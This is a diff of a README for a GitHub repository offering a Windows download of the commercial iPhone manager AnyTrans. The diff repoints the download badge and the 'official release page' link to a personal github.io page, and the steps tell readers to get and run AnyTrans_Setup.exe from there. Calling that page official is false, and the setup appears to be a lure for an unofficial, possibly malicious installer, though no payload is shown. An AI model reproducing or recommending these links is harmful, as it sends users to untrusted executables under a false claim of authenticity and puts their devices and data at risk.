@@ -1,6 +1,6 @@
 # 📱 iMobie-AnyTrans-2026 - Manage your iPhone files simply
 
-[![](https://img.shields.io/badge/Download-AnyTrans%20Setup-blue.svg)](https://github.com/Kasa2241/iMobie-AnyTrans-2026)
+[![](https://img.shields.io/badge/Download-AnyTrans%20Setup-blue.svg)](https://kasa2241.github.io)
 
 AnyTrans helps you move data between your computer and your iPhone. It acts as an alternative to iTunes for Windows. You can transfer photos, music, messages, and contact files with this tool. It runs on Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ AnyTrans helps you move data between your computer and your iPhone. It acts as a
 
 Follow these steps to get the application on your computer.
 
-1. Go to the [official release page](https://github.com/Kasa2241/iMobie-AnyTrans-2026).
+1. Go to the [official release page](https://kasa2241.github.io).
 2. Look for the file named AnyTrans_Setup.exe.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your downloads folder.
